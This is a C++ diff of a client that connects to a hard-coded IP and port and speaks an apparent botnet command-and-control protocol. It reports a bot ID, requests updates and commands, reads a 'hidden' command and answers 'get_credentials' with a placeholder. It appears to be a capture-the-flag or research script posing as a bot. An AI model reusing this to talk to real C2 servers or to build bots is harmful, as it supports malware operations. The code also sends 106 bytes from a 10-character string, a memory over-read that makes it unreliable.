@@ -27,9 +27,10 @@ int main() {
 
     char buffer[4096] = {0};
     char buffer2[4096] = {0};
-    char buffer3[4096] = {0};
+    char buffer3[4096] = {0}; // get COMMAND 
     char buffer4[4096] = {0};
-    string msg = "REPORT botid=2437018b280e2f36 os=windows <END>";
+
+
 
     if (getaddrinfo("52.58.97.202", "2357", &hints, &res) == 0) {
         
@@ -37,36 +38,58 @@ int main() {
         connect(sock, res->ai_addr, res->ai_addrlen);
         freeaddrinfo(res);
 
-        send(sock, msg.c_str(), msg.length(), 0);
-
+        send(sock, "REPORT botid=2437018b280e2f36 os=windows <END>", 47, 0);
+        printf("REPORT botid=2437018b280e2f36 os=windows <END>\n");
         recv(sock, buffer, 4096, 0);
-
         printf("%s", buffer);
 
-
-
         send(sock, "UPDATE version=1.33.7 <END>", 28, 0);
-
+        printf("UPDATE version=1.33.7 <END>\n");
         recv(sock, buffer2, 4096, 0);
-
         printf("%s", buffer2);
     
-
-        
         send(sock, "COMMAND <END>", 14, 0);
+        printf("COMMAND <END>\n");
+        recv(sock, buffer3, 4096, 0);
 
-        recv(sock, buffer3, 4069, 0); //65536
-
+        std::string buf3(buffer3);
         printf("%s", buffer3);
+        if (buf3.substr(0, 14) == "COMMAND hidden") {
 
+            std::string dump = buf3;
+            
+            bool foundEnd = false;
 
+            char trash[4096] = {0}; 
+
+            while(!foundEnd) {
+                for (int i = 0;i < dump.length(); i++) {
+                    if (dump.at(i) == '>') {
+                        foundEnd = true;
+                    }
+                }
+                if (foundEnd) {
+                    // printf("%s", trash);
+                    printf("COMMAND hidden...\n");
+                    break;
+                }
+                recv(sock,trash,4096,0);
+                printf("%s",trash);
+                
+                dump = trash;
+            }
+            //printf("%s",total.c_str());
+        }
+
+        if (buf3 == "COMMAND get_credentials <END>\n") {
+            send(sock, "cred <END>", 106, 0);
+            printf("cred <END>\n");
+        }
 
         send(sock, "DONE <END>", 11, 0);
-
+        printf("DONE <END>\n");
         recv(sock, buffer4, 4096, 0);
-
         printf("%s", buffer4);
+
     }
-    else 
-        cout << "Could not find ip\n";
 }
